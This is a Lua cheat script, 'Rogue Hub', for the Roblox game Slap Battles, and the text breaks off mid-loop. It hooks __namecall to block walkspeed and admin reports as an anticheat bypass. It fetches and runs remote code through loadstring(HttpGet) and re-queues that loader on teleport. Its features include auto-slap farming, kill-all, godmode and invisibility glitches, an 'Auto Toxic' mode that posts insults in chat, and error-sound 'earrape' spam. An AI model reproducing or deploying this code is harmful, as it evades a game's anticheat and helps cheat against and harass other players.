if getgenv().Rogue_AlreadyLoaded ~= nil then error("Rogue Hub was already found running or you have other scripts executed!") return else getgenv().Rogue_AlreadyLoaded = 0 end

if game.PlaceId == 6403373529 or game.PlaceId == 9015014224 or game.PlaceId == 9431156611 or game.PlaceId == 11520107397 then else return end

getgenv().isLoaded = false
local isTping = false
local isTyping = false

local timeSlapped = 0
local timeRagdolled = 0

-- easter egg moment
if syn then
    print("DohmBoy is cool!")
end

if game.PlaceId == 9431156611 then
	workspace:WaitForChild("Map"):WaitForChild("OriginOffice"):WaitForChild("Antiaccess"):Destroy()
    
	local part = Instance.new("Part", workspace)

	part.Name = "acidGod"
	part.Size = Vector3.new(145, 4, 140)
	part.Position = Vector3.new(-66.5, 0.05, -739)
	part.CanCollide = false
	part.Anchored = true
	part.Transparency = 1
	
	local lava = Instance.new("Part", workspace)

	lava.Name = "lavaGod"
	lava.Size = Vector3.new(144, 4, 195)
	lava.Position = Vector3.new(-248, -67.252, 399.5)
	lava.CanCollide = false
	lava.Anchored = true
	lava.Transparency = 1
	
	local jesus = Instance.new("Part", workspace)

	jesus.Name = "jesusWalk"
	jesus.Size = Vector3.new(2047, 0.009, 2019)
	jesus.Position = Vector3.new(-80.5, 8.005, -246.5)
	jesus.CanCollide = false
	jesus.Anchored = true
	jesus.Transparency = 1
else
    local arenaVoid = Instance.new("Part", workspace)

	arenaVoid.Name = "arenaVoid"
	arenaVoid.Size = Vector3.new(798, 1, 1290)
	arenaVoid.Position = Vector3.new(3450, 59.009, 68)
	arenaVoid.CanCollide = false
	arenaVoid.Anchored = true
	arenaVoid.Transparency = 1
end

local teleportFunc = queueonteleport or queue_on_teleport or syn and syn.queue_on_teleport

if teleportFunc then
    teleportFunc([[loadstring(game:HttpGet("https://raw.githubusercontent.com/Kitzoon/Rogue-Hub/main/Main.lua", true))()]])
end

-- walkspeed anticheat bypass
if game.PlaceId == 9431156611 and getrawmetatable and hookmetamethod then
    local old
    old = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        
        if not checkcaller() and tostring(self) == "WS" and tostring(method) == "FireServer" then
            return
        end
        
        if not checkcaller() and tostring(self) == "AdminGUI" and tostring(method) == "FireServer" then
            return
        end
        
        return old(self, ...)
    end)
elseif game.PlaceId ~= 9431156611 and getrawmetatable and hookmetamethod then
    local old
    old = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        
        if not checkcaller() and tostring(self) == "WalkSpeedChanged" and tostring(method) == "FireServer" then
            return
        end
        
        if not checkcaller() and tostring(self) == "AdminGUI" and tostring(method) == "FireServer" then
            return
        end
        
        return old(self, ...)
    end)
end

-- typing detector
game:GetService("UserInputService").InputBegan:Connect(function(input, typing)
    isTyping = typing
end)

local sound = Instance.new("Sound", workspace)
sound.SoundId = "rbxassetid://1548304764"
sound.PlayOnRemove = true
sound.Volume = 0.5

function CheckConfigFile()
    if not isfile("/Rogue Hub/Configs/Keybind.ROGUEHUB") then return Enum.KeyCode.RightControl else return Enum.KeyCode[game:GetService("HttpService"):JSONDecode(readfile("/Rogue Hub/Configs/Keybind.ROGUEHUB"))["Key"]] or Enum.KeyCode.RightControl end
end

local Config = {
    WindowName = "Rogue Hub | " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Slap Battles",
    Color = Color3.fromRGB(201,144,150),
    Keybind = CheckConfigFile()
}

local localPlr = game:GetService("Players").LocalPlayer
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kitzoon/Rogue-Hub/main/Extra/BracketV3.lua"))()
local window = library:CreateWindow(Config, game:GetService("CoreGui"))
local mainTab = window:CreateTab("Slap Battles")

getgenv().settings = {
    gloveExtend = false,
    extendOption = "Meat Stick",
    autoClicker = false,
    autoToxic = false,
    walkSpeed = 20,
    jumpPower = 50,
    noRagdoll = false,
    noReaper = false,
    noTimestop = false,
    noRock = false,
    autoJoin = false,
    joinOption = "Normal Arena",
    noVoid = false,
    auraSlap = false,
    auraOption = "Legit",
    voidRainbow = false,
    voidForce = false,
    playerForce = false,
    fov = 70,
    spamFart = false,
    spin = false,
    spinSpeed = 10,
    autoEquip = false,
    wallNoclip = false,
    acidGod = false,
    lavaGod = false,
    walkSpeedTog = false,
    jumpPowerTog = false,
    walkJesus = false,
    candyFarm = false,
    invis = false,
    tpClick = false,
    slappleFarm = false,
    spamGlove = false,
    infGold = false,
    autoItems = false,
    hipHeight = false,
    hipHeightKey = "NONE",
    hipHeightNum = 1,
    ballerFarm = false,
    playerNametag = false
}

if makefolder and isfolder and not isfolder("Rogue Hub") then
    makefolder("Rogue Hub")
    
    makefolder("Rogue Hub/Configs")
    makefolder("Rogue Hub/Data")
end

if readfile and isfile and isfile("Rogue Hub/Configs/SlapBattles_Config.ROGUEHUB") then
    getgenv().settings = game:GetService("HttpService"):JSONDecode(readfile("Rogue Hub/Configs/SlapBattles_Config.ROGUEHUB"))
end

local function saveSettings()
    if writefile then
        writefile("Rogue Hub/Configs/SlapBattles_Config.ROGUEHUB", game:GetService("HttpService"):JSONEncode(getgenv().settings))
    end
end

function getQuote()
    local userQuotes = game:GetService("HttpService"):JSONDecode(readfile("/Rogue Hub/Configs/Quotes.ROGUEHUB"))
    return userQuotes[math.random(#userQuotes)]
end

local function getTool()
    local tool = localPlr.Character:FindFirstChildOfClass("Tool") or localPlr:WaitForChild("Backpack"):FindFirstChildOfClass("Tool")
    
    if tool ~= nil and tool:FindFirstChild("Glove") ~= nil then
        return tool    
    end
end

local function getBackpackTool()
    local tool = localPlr:WaitForChild("Backpack"):FindFirstChildOfClass("Tool")
    
    if tool ~= nil and tool:FindFirstChild("Glove") ~= nil then
        return tool
    end
end

localPlr.CharacterAdded:Connect(function()
    local humanoid = localPlr.Character:WaitForChild("Humanoid")
    
    if getgenv().settings.walkSpeedTog then
        humanoid.WalkSpeed = getgenv().settings.walkSpeed or 20
    else
        humanoid.WalkSpeed = 20
    end
    
    if getgenv().settings.jumpPowerTog then
        humanoid.JumpPower = getgenv().settings.jumpPower or 50
    else
        humanoid.JumpPower = 50    
    end
    
    if getgenv().settings.invis and localPlr.leaderstats.Slaps.Value >= 666 then
        task.wait(0.5)
        
        if localPlr.leaderstats.Glove.Value == "Ghost" then
            fireclickdetector(workspace.Lobby.Ghost.ClickDetector)
        end
        
        game:GetService("ReplicatedStorage").Ghostinvisibilityactivated:FireServer()
        
        repeat wait() until localPlr.Character:FindFirstChild("entered")
        
        for _,v in pairs(game.Lighting:GetChildren()) do
            if v.Name ~= "DepthOfField" or v.Name ~= "Bloom" or v.Name ~= "ColorCorrection" then
                v:Destroy()    
            end
        end
    end
    
    if getgenv().settings.infGold and getgenv().isLoaded then
        if localPlr.leaderstats.Slaps.Value >= 2500 and localPlr.leaderstats.Glove.Value ~= "Golden" and not localPlr.Character:FindFirstChild("entered") then
            fireclickdetector(workspace.Lobby.Golden.ClickDetector)
        elseif localPlr.leaderstats.Slaps.Value <= 2500 and getgenv().settings.invis then
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Rogue Hub Error",
                Text = "You don't have enough slaps for the golden glove! (2500 Slaps)",
                Duration = 5
            })
            return
        end
        
        wait(0.3)
        
        game:GetService("ReplicatedStorage").Goldify:FireServer(true, BrickColor.new(24))
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Godmode Activated",
            Text = "You can now equip any other glove you want!",
            Duration = 5
        })
        
        repeat wait() until localPlr.Character:FindFirstChild("entered")
        
        for _,v in pairs(game.Lighting:GetChildren()) do
            if v.Name ~= "DepthOfField" or v.Name ~= "Bloom" or v.Name ~= "ColorCorrection" then
                v:Destroy()    
            end
        end
    end
    
    task.wait(3)
    
    if getgenv().settings.noRagdoll then
        if localPlr.Character.HumanoidRootPart == nil then return end
        
        localPlr.Character.Ragdolled:GetPropertyChangedSignal("Value"):Connect(function()
            if localPlr.Character:FindFirstChild("HumanoidRootPart") and localPlr.Character.Ragdolled.Value == true then
                if localPlr.Character.HumanoidRootPart == nil or getgenv().settings.noRagdoll == false or getgenv().slapFarm or isTping then return end
                
                local oldCFrame = localPlr.Character.HumanoidRootPart.CFrame
                
                repeat task.wait()
                    localPlr.Character.HumanoidRootPart.CFrame = oldCFrame
                until localPlr.Character:FindFirstChild("HumanoidRootPart") == nil or localPlr.Character.Ragdolled.Value == false
            end
        end)
    end
    
    localPlr.Character.Ragdolled:GetPropertyChangedSignal("Value"):Connect(function()
        if localPlr.Character.Ragdolled then
            timeRagdolled = timeRagdolled + 1
        end
    end)
    
    if getgenv().settings.noReaper and game.PlaceId ~= 11520107397 then
        localPlr.Character.ChildAdded:Connect(function(child)
            if child.Name == "DeathMark" and child:IsA("StringValue") then
                game:GetService("ReplicatedStorage").ReaperGone:FireServer(child)
                game:GetService("Lighting"):WaitForChild("DeathMarkColorCorrection"):Destroy()
                child:Destroy()
            end
        end)
    end
    
    if getgenv().settings.wallNoclip then
        localPlr.Character:FindFirstChild("HumanoidRootPart").Touched:Connect(function(part)
            if part.Name == "wall" and getgenv().settings.wallNoclip then
                part.CanCollide = not getgenv().settings.wallNoclip
            end
        end)
    end
    
    repeat task.wait() until getTool() ~= nil
    
    if getgenv().settings.auraSlap and getgenv().settings.auraOption == "Legit" then
        getTool().Glove.Touched:Connect(function(part)
            if part.Parent:FindFirstChildOfClass("Humanoid") and getgenv().settings.auraSlap and getgenv().settings.auraOption == "Legit" and not getgenv().slapFarm then
                getTool():Activate()
                task.wait(0.3)
            end
        end)
    end
    
    while wait() and getgenv().settings.auraSlap and getgenv().settings.auraOption == "Blatant" and not getgenv().slapFarm and getTool() do
        for _, target in ipairs(game:GetService("Players"):GetPlayers()) do
            if getTool() and target.Character and target.Character:FindFirstChild("Humanoid") and localPlr.Character and localPlr.Character:FindFirstChild("Humanoid") and target.Character:FindFirstChild("rock") == nil and target.Character:FindFirstChild("Reversed") == nil and getgenv().settings.auraOption == "Blatant" and target:DistanceFromCharacter(localPlr.Character.HumanoidRootPart.Position) <= 20.1 and getTool().Name == "Default" then
                game:GetService("ReplicatedStorage").b:FireServer(target.Character.HumanoidRootPart)
                wait(0.3)
            end
        end
    end
end)

-- Player

local playerSec = mainTab:CreateSection("Player")

-- CANDY CORN IS SHIT IF YOU EVER GET IT WHEN TRICK OR TREATING THROW THEM OUT
if game.PlaceId ~= 9431156611 and game.PlaceId ~= 11520107397 then
    -- this is an old halloween event feature, now its commented out. but still left just in case its ever needed
    
    -- local corn = playerSec:CreateToggle("Candy Corns Farm", false, function(bool)
    --     getgenv().settings.candyFarm = bool
        
    --     while getgenv().isLoaded and getgenv().settings.candyFarm and localPlr.Character ~= nil and localPlr.Character:FindFirstChild("HumanoidRootPart") ~= nil and not getgenv().slapFarm and not getgenv().settings.invis and wait() do
    --         for _, corn in pairs(workspace.CandyCorns:GetChildren()) do
    --             if getgenv().settings.candyFarm and corn:FindFirstChild("TouchInterest") ~= nil then
    --                 corn.CFrame = localPlr.Character.HumanoidRootPart.CFrame
    --             end
    --         end
    --     end
    -- end)
    
    -- corn:AddToolTip("Farm's candy corns for you. (from the latest halloween event)")
    
    local errorlol = playerSec:CreateToggle("Error Sound Earrape (FE)", getgenv().settings.errorSound or false, function(bool)
        getgenv().settings.errorSound = bool
        saveSettings()
    end)
    
    errorlol:AddToolTip("spams the error sound, practically ear rape for everyone in your server.")
    
    local slapple = playerSec:CreateToggle("Slapples Glove Farm", getgenv().settings.slappleFarm or false, function(bool)
        getgenv().settings.slappleFarm = bool
        saveSettings()
    end)
        
    slapple:AddToolTip("Auto farm's slapple gloves for you. (gets you free slaps)")
end

playerSec:CreateToggle("Autoclicker", getgenv().settings.autoClicker or false, function(bool)
    getgenv().settings.autoClicker = bool
    saveSettings()
end)

playerSec:CreateToggle("Click TP", getgenv().settings.tpClick or false, function(bool)
    getgenv().settings.tpClick = bool
    saveSettings()
end)

-- credits to infinite yield for this
localPlr:GetMouse().Button1Down:Connect(function()
    if localPlr.Character ~= nil and localPlr.Character:FindFirstChild("HumanoidRootPart") ~= nil and getgenv().settings.tpClick and not getgenv().settings.candyFarm and not getgenv().slapFarm and not isTping then
        localPlr.Character.HumanoidRootPart.CFrame = localPlr:GetMouse().Hit + Vector3.new(0,7,0)
        
        isTping = true
        wait(0.3)
        isTping = false
    end
end)

if game.PlaceId ~= 9431156611 then
    local toxicTog = playerSec:CreateToggle("Auto Toxic", getgenv().settings.autoToxic or false, function(bool)
        getgenv().settings.autoToxic = bool
        saveSettings()
        
        if getgenv().settings.autoToxic then
            localPlr.leaderstats.Slaps:GetPropertyChangedSignal("Value"):Connect(function()
                if not getgenv().settings.autoToxic or getgenv().slapFarm then return end
                
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(getQuote(), "All")
            end)
        end
    end)
    
    toxicTog:AddToolTip("automatically says a toxic phrase when you slap someone")
    
    localPlr.leaderstats.Slaps:GetPropertyChangedSignal("Value"):Connect(function()
        timeSlapped = timeSlapped + 1
    end)
end

playerSec:CreateToggle("Infinite Jump", getgenv().settings.infJump or false, function(bool)
    getgenv().settings.infJump = bool
    saveSettings()
end)

local noRagTog = playerSec:CreateToggle("Anti Ragdoll", getgenv().settings.noRagdoll or false, function(bool)
    getgenv().settings.noRagdoll = bool
    saveSettings()
    
    if getgenv().settings.noRagdoll and localPlr.Character:FindFirstChildOfClass("Humanoid") then
        localPlr.Character.Ragdolled:GetPropertyChangedSignal("Value"):Connect(function()
            if localPlr.Character:FindFirstChild("HumanoidRootPart") and localPlr.Character.Ragdolled.Value == true then
                if not localPlr.Character:FindFirstChild("HumanoidRootPart") or getgenv().settings.noRagdoll == false or getgenv().slapFarm or isTping then return end
                
                local oldCFrame = localPlr.Character.HumanoidRootPart.CFrame
                
                repeat task.wait()
                    localPlr.Character.Head.Anchored = true
                until localPlr.Character:FindFirstChild("Head") == nil or localPlr.Character.Ragdolled.Value == false
                
                localPlr.Character.Head.Anchored = false
            end
        end)
    end
end)

if localPlr.Character:FindFirstChildOfClass("Humanoid") then
    localPlr.Character.Ragdolled:GetPropertyChangedSignal("Value"):Connect(function()
        if localPlr.Character.Ragdolled then
            timeRagdolled = timeRagdolled + 1
        end
    end)
end

noRagTog:AddToolTip("looks clunky, but works good")

if game.PlaceId ~= 9431156611 then
    if game.PlaceId ~= 11520107397 then
        local reaperGod = playerSec:CreateToggle("Reaper Godmode", getgenv().settings.noReaper or false, function(bool)
            getgenv().settings.noReaper = bool
            saveSettings()
            
            if getgenv().settings.noReaper and localPlr.Character:FindFirstChildOfClass("Humanoid") then
                for _, v in next, localPlr.Character:GetChildren() do
                    if v.Name == "DeathMark" and v:IsA("StringValue") then
                        game:GetService("ReplicatedStorage").ReaperGone:FireServer(v)
                        game:GetService("Lighting"):WaitForChild("DeathMarkColorCorrection"):Destroy()
                        v:Destroy()
                    end
                end
                
                localPlr.Character.ChildAdded:Connect(function(child)
                    if child.Name == "DeathMark" and child:IsA("StringValue") then
                        game:GetService("ReplicatedStorage").ReaperGone:FireServer(child)
                        game:GetService("Lighting"):WaitForChild("DeathMarkColorCorrection"):Destroy()
                        child:Destroy()
                    end
                end)
            end
        end)
        
        reaperGod:AddToolTip("immune from the reaper death ability")
        
        local rockGod = playerSec:CreateToggle("Rock Godmode", getgenv().settings.noRock or false, function(bool)
            getgenv().settings.noRock = bool
            saveSettings()
            
            if getgenv().settings.noRock then
                for _, target in pairs(game:GetService("Players"):GetPlayers()) do
                    if localPlr ~= target and target.Character and target.Character:FindFirstChild("rock") and target.Character.rock:FindFirstChild("TouchInterest") then
                        target.Character:FindFirstChild("rock").TouchInterest:Destroy()
                        
                        if target.leaderstats.Glove.Value == "MEGAROCK" then
                            target.Character.rock:Destroy()
                        end
                    end
                end
            end
        end)
        
        rockGod:AddToolTip("immune from dangerous rocks! sometimes works, sometimes doesnt")
        
        local noClipWall = playerSec:CreateToggle("Giant Wall Noclip", getgenv().settings.wallNoclip or false, function(bool)
            getgenv().settings.wallNoclip = bool
            saveSettings()
            
            if getgenv().settings.wallNoclip then
                localPlr.Character:FindFirstChild("HumanoidRootPart").Touched:Connect(function(part)
                    if part.Name == "wall" and getgenv().settings.wallNoclip then
                        part.CanCollide = not getgenv().settings.wallNoclip
                    end
                end)
            end
        end)
        
        noClipWall:AddToolTip("clip's through the giant wall ability.")
        
        playerSec:CreateToggle("Move in Timestop & Cutscenes", getgenv().settings.noTimestop or false, function(bool)
            getgenv().settings.noTimestop = bool
            saveSettings()
        end)
        
        local togInvis = playerSec:CreateToggle("Invisible (FE)", false, function(bool)
            getgenv().settings.invis = bool
            
            if not getgenv().settings.invis and getgenv().isLoaded and localPlr.leaderstats.Slaps.Value >= 666 and localPlr.Character:FindFirstChild("entered") then
                game:GetService("ReplicatedStorage").Ghostinvisibilitydeactivated:FireServer()
                
                localPlr.Character:WaitForChild("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
                return
            end
            
            if getgenv().settings.invis and getgenv().isLoaded and localPlr.Character:FindFirstChild("entered") then
                localPlr.Character:WaitForChild("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
                
                repeat wait() until localPlr.Character and localPlr.Character:WaitForChild("HumanoidRootPart") and not localPlr.Character:FindFirstChild("entered")
            end
            
            if getgenv().settings.invis then
                if localPlr.leaderstats.Slaps.Value >= 666 and localPlr.leaderstats.Glove.Value ~= "Ghost" and not localPlr.Character:FindFirstChild("entered") then
                    fireclickdetector(workspace.Lobby.Ghost.ClickDetector)
                elseif localPlr.leaderstats.Slaps.Value <= 666 and getgenv().settings.invis then
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = "Rogue Hub Error",
                        Text = "You don't have enough slaps for the ghost glove! (666 Slaps)",
                        Duration = 5
                    })
                    return
                end
                
                wait(0.3)
                
                game:GetService("ReplicatedStorage").Ghostinvisibilityactivated:FireServer()
                
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Invisible Activated",
                    Text = "You can now equip any other glove you want!",
                    Duration = 5
                })
            
                repeat wait() until localPlr.Character:FindFirstChild("entered")
                
                for _,v in pairs(game.Lighting:GetChildren()) do
                    if v.Name ~= "DepthOfField" or v.Name ~= "Bloom" or v.Name ~= "ColorCorrection" then
                        v:Destroy()    
                    end
                end
            end
        end)
        
        togInvis:AddToolTip("Uses a glitch in Slap Battles to make you invisible. (Requires 666 slaps or more)")
        
        local godded = playerSec:CreateToggle("Godmode (FE)", false, function(bool)
            getgenv().settings.infGold = bool
            
            if getgenv().settings.infGold and getgenv().isLoaded and localPlr.Character:FindFirstChild("entered") then
                localPlr.Character:WaitForChild("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
                
                repeat wait() until localPlr.Character and localPlr.Character:WaitForChild("HumanoidRootPart") and not localPlr.Character:FindFirstChild("entered")
            end
            
            if getgenv().settings.infGold and getgenv().isLoaded then
                if localPlr.leaderstats.Slaps.Value >= 2500 and localPlr.leaderstats.Glove.Value ~= "Golden" and not localPlr.Character:FindFirstChild("entered") then
                    fireclickdetector(workspace.Lobby.Golden.ClickDetector)
                elseif localPlr.leaderstats.Slaps.Value <= 2500 and getgenv().settings.invis then
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = "Rogue Hub Error",
                        Text = "You don't have enough slaps for the golden glove! (2500 Slaps)",
                        Duration = 5
                    })
                    return
                end
                
                wait(0.3)
                
                game:GetService("ReplicatedStorage").Goldify:FireServer(true, BrickColor.new(24))
                
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Godmode Activated",
                    Text = "You can now equip any other glove you want!",
                    Duration = 5
                })
            
                repeat wait() until localPlr.Character:FindFirstChild("entered")
                
                for _,v in pairs(game.Lighting:GetChildren()) do
                    if v.Name ~= "DepthOfField" or v.Name ~= "Bloom" or v.Name ~= "ColorCorrection" then
                        v:Destroy()    
                    end
                end
            end
            
            saveSettings()
        end)
        
        godded:AddToolTip("Uses a glitch on a certain glove to give you godmode. (Requires 2500 slaps or more)")
    end
    
    playerSec:CreateToggle("Anti Void", getgenv().settings.noVoid or false, function(bool)
        getgenv().settings.noVoid = bool
        
        workspace.dedBarrier.CanCollide = getgenv().settings.noVoid or false
        workspace.arenaVoid.CanCollide = getgenv().settings.noVoid or false
        
        saveSettings()
    end)
end

if game.PlaceId == 9431156611 then
    local accid = playerSec:CreateToggle("Anti Toxic Waste", getgenv().settings.acidGod or false, function(bool)
		getgenv().settings.acidGod = bool
		
		if workspace:FindFirstChild("acidGod") ~= nil then
			workspace.acidGod.CanCollide = getgenv().settings.acidGod
		end
		
		saveSettings()
    end)
    
    accid:AddToolTip("Protects you from Acid.")
    
    local lava = playerSec:CreateToggle("Anti Lava", getgenv().settings.lavaGod or false, function(bool)
		getgenv().settings.lavaGod = bool
		
		if workspace:FindFirstChild("lavaGod") ~= nil then
			workspace.lavaGod.CanCollide = getgenv().settings.lavaGod
		end
		
		saveSettings()
    end)
    
    lava:AddToolTip("Protects you from Lava.")
    
    local jesussy = playerSec:CreateToggle("Jesus Walk", getgenv().settings.walkJesus or false, function(bool)
		getgenv().settings.walkJesus = bool
		
		if workspace:FindFirstChild("jesusWalk") ~= nil then
			workspace.jesusWalk.CanCollide = getgenv().settings.walkJesus
		end
		
		saveSettings()
    end)
    
    jesussy:AddToolTip("Lets you walk on water.")
end

local hipTog = playerSec:CreateToggle("Hip Height Edit", getgenv().settings.hipHeight or false, function(bool)
    getgenv().settings.hipHeight = bool
	saveSettings()
end)

hipTog:AddToolTip("edits your hip height and makes you taller, useful for avoiding slaps or fighting against another exploiter.")

hipTog:CreateKeybind(tostring(getgenv().settings.hipHeightKey or "NONE"):gsub("Enum.KeyCode.", ""), function(key)
	if key == "Escape" or key == "Backspace" then key = "NONE" end
	
    if key == "NONE" then return else getgenv().settings.hipHeightKey = Enum.KeyCode[key] end
end)

playerSec:CreateSlider("Hip Height", 1,20.1,getgenv().settings.hipHeightNum or 1,true, function(value)
	getgenv().settings.hipHeightNum = value
	saveSettings()
end)

local spinTog = playerSec:CreateToggle("Spin", getgenv().settings.spin or false, function(bool)
    getgenv().settings.spin = bool
    saveSettings()
end)

spinTog:AddToolTip("Makes your player spin around, looks derpy :D")

playerSec:CreateSlider("Spin Speed", 10,100,getgenv().settings.spinSpeed or 10,true, function(value)
	getgenv().settings.spinSpeed = value
	saveSettings()
end)

local togspeed = playerSec:CreateToggle("Walk Speed", getgenv().settings.walkSpeedTog or false, function(bool)
    getgenv().settings.walkSpeedTog = bool
    saveSettings()
    
    if getgenv().settings.walkSpeedTog then
        localPlr.Character.Humanoid.WalkSpeed = getgenv().settings.walkSpeed
    else
        localPlr.Character.Humanoid.WalkSpeed = 20
    end
end)

togspeed:CreateKeybind(tostring(getgenv().settings.walkSpeedKey or "NONE"):gsub("Enum.KeyCode.", ""), function(key)
	if key == "Escape" or key == "Backspace" then key = "NONE" end
	
    if key == "NONE" then return else getgenv().settings.walkSpeedKey = Enum.KeyCode[key] end
end)

playerSec:CreateSlider("Walk Speed", 20,300,getgenv().settings.walkSpeed or 20,true, function(value)
	getgenv().settings.walkSpeed = value
    saveSettings()
    
    if getgenv().settings.walkSpeedTog then
        localPlr.Character.Humanoid.WalkSpeed = getgenv().settings.walkSpeed
    else
        localPlr.Character.Humanoid.WalkSpeed = 20
    end
end)

local togjump = playerSec:CreateToggle("Jump Power", getgenv().settings.jumpPowerTog or false, function(bool)
    getgenv().settings.jumpPowerTog = bool
    saveSettings()
    
    if getgenv().settings.jumpPowerTog then
        localPlr.Character.Humanoid.JumpPower = getgenv().settings.jumpPower or 50
    else
        localPlr.Character.Humanoid.JumpPower = 50    
    end
end)

togjump:CreateKeybind(tostring(getgenv().settings.jumpPowerKey or "NONE"):gsub("Enum.KeyCode.", ""), function(key)
	if key == "Escape" or key == "Backspace" then key = "NONE" end
	
    if key == "NONE" then return else getgenv().settings.jumpPowerKey = Enum.KeyCode[key] end
end)

playerSec:CreateSlider("Jump Power", 50,300,getgenv().settings.jumpPower or 50,true, function(value)
	getgenv().settings.jumpPower = value
	saveSettings()
	
	if getgenv().settings.jumpPowerTog then
	    localPlr.Character.Humanoid.JumpPower = getgenv().settings.jumpPower
	else
	    localPlr.Character.Humanoid.JumpPower = 50
	end
end)

if game.PlaceId ~= 9431156611 then
    local isEnabled = false
    
    local plateBadge = playerSec:CreateButton("Get Plate Master Badge", function()
        if isEnabled then
            isEnabled = false
        else
            isEnabled = true
        end
        
        if not localPlr.Character:FindFirstChild("entered") and localPlr.Character:FindFirstChild("HumanoidRootPart") then
            repeat wait(0.5)
                firetouchinterest(localPlr.Character.HumanoidRootPart, workspace.Lobby.Teleport1, 0)
                firetouchinterest(localPlr.Character.HumanoidRootPart, workspace.Lobby.Teleport1, 1)
            until localPlr.Character:FindFirstChild("entered")
        end
        
        if isEnabled and localPlr.Character then
            repeat task.wait()
                localPlr.Character.HumanoidRootPart.CFrame = workspace.Arena.Plate.CFrame
            until not isEnabled or localPlr.PlayerGui.PlateIndicator.TextLabel.Text == "Plate Counter: 600" or not localPlr.Character or not localPlr.Character:FindFirstChild("entered")
        end
    end)
    
    plateBadge:AddToolTip("makes you sit on the plate for 10 minutes to get the plate master badge.")
    
    local cubeGod = playerSec:CreateButton("Delete the Cube of Death", function()
        if game:GetService("Workspace").Arena.CubeOfDeathArea:FindFirstChild("the cube of death(i heard it kills)") ~= nil then
            game:GetService("Workspace").Arena.CubeOfDeathArea:FindFirstChild("the cube of death(i heard it kills)"):Destroy()
        else
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Rogue Hub Error",
                Text = "The cube of death is already deleted!",
                Duration = 5
            })
        end
    end)
    
    cubeGod:AddToolTip("Deletes the cube of death, practically making you invisible to it.")
end

if game.PlaceId == 9431156611 then
    local butPhase = playerSec:CreateButton("Phase", function()
        if localPlr.Character ~= nil and not localPlr.Character:FindFirstChild("inMatch").Value then
            workspace.Lobby.Floor.CanCollide = false
            workspace.Lobby.FloorFraming.CanCollide = false
            
            wait(0.5)
            
            workspace.Lobby.Floor.CanCollide = true
            workspace.Lobby.FloorFraming.CanCollide = true
        else
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Rogue Hub Error",
                Text = "Phase only works when your in the lobby.",
                Duration = 5
            })
        end
    end)
    
    butPhase:AddToolTip("Phases you through the lobby (only works when the game hasn't started)")
end

-- Glove

local gloveSec = mainTab:CreateSection("Glove")
local name = "Slap Farm"

if game.PlaceId == 9431156611 then name = "Kill All (PATCHED, DONT USE)" end

local farmTog = gloveSec:CreateToggle(name, false, function(bool)
    getgenv().slapFarm = bool
    
    if game.PlaceId == 9431156611 then
        for _,v in pairs(workspace:GetDescendants()) do
            if v:IsA("Seat") then
                v.Disabled = getgenv().slapFarm
            end
        end
        
        if getBackpackTool() and getgenv().slapFarm then
            localPlr.Character.Humanoid:EquipTool(getBackpackTool())
        end
    else
        if setfpscap and getgenv().slapFarm then
            setfpscap(50)
        elseif setfpscap and not getgenv().slapFarm then
            setfpscap(500)
        end
    end
    
    while wait() and getgenv().slapFarm do
        if game.PlaceId ~= 9431156611 then
            for _, target in next, game:GetService("Players"):GetPlayers() do
                if target ~= localPlr and target.Character ~= nil and target.Character:FindFirstChild("entered") ~= nil and localPlr.Character:FindFirstChild("entered") ~= nil and target.Character:FindFirstChild("rock") == nil and target.Character:FindFirstChild("Ragdolled").Value == false and target.Character:FindFirstChild("Reversed") == nil and target.Character:FindFirstChild("Right Arm") and target.Character:FindFirstChild("Error") == nil and target.Character:FindFirstChild("Orbit") == nil and target.Character:FindFirstChild("Spectator") == nil and target.Backpack:FindFirstChild("Spectator") == nil and getgenv().slapFarm then                        
                    pcall(function()
                        if getTool() ~= nil and getTool().Name == "Default" and getgenv().slapFarm then
                            localPlr.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0,8,0)
                            task.wait(0.25)
                            game:GetService("ReplicatedStorage").b:FireServer(target.Character.HumanoidRootPart)
                        elseif getTool() ~= nil and getTool().Name == "Bull" and getgenv().slapFarm then
                            localPlr.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0,8,0)
                            task.wait(0.25)
                            game:GetService("ReplicatedStorage").BullHit:FireServer(target.Character.HumanoidRootPart)
                        elseif getTool() ~= nil and getTool().Name == "Ghost" and getgenv().slapFarm then
                            localPlr.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0,8,0)
                            task.wait(0.25)
                            game:GetService("ReplicatedStorage").GhostHit:FireServer(target.Character.HumanoidRootPart)
                        elseif getTool() ~= nil and getTool().Name == "Killstreak" and getgenv().slapFarm then
                            repeat task.wait(0.25)
                                localPlr.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0,8,0)
                                task.wait(0.25)
                                game:GetService("ReplicatedStorage").KSHit:FireServer(target.Character.HumanoidRootPart)
                            until target.Character == nil or localPlr.Character == nil or target.Character:FindFirstChild("Ragdolled").Value == true
                        elseif getTool() ~= nil and getTool().Name ~= "Default" and getgenv().slapFarm then
                            repeat task.wait()
                                localPlr.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,3.5)
                                getTool():Activate()
                            until target.Character == nil or localPlr.Character == nil or target.Character:FindFirstChild("Ragdolled").Value == true
                        end
                    end)
                    
                    if getgenv().settings.autoToxic then
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(target.Name .. " " .. getQuote(), "All")    
                    end
                    
                    task.wait(0.35)
                end
            end
        else
            -- rogue hub's most advanced kill all yet!
            
            for _, target in next, game:GetService("Players"):GetPlayers() do
